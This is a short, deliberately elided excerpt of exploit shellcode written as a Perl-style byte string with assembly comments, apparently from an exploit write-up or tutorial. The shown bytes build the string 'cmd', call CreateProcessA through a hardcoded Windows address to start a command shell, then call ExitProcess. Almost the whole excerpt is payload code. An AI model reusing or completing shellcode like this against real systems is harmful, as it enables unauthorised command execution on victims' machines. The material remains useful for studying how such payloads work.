...
$shellcode = 	"\x33\xdb".		# xor ebx, ebx
		...
		"\xc7\x42\xfc\x63\x6d".	# mov dword ptr[edx-4], 0x01646D63 ("cmd\x01")
		"\x64\x01".		#
		...
		"\xb8\x41\x77\xf7\xbf".	# mov eax, 0xBFF77741 ~= CreateProcessA
		"\xff\xd0".		# call eax
		"\xb8\xf8\xd4\xf8\xbf".	# mov eax, 0xBFF8D4F8 ~= ExitProcess
		"\xff\xd0".		# call eax
		"\xcc";			# int 3
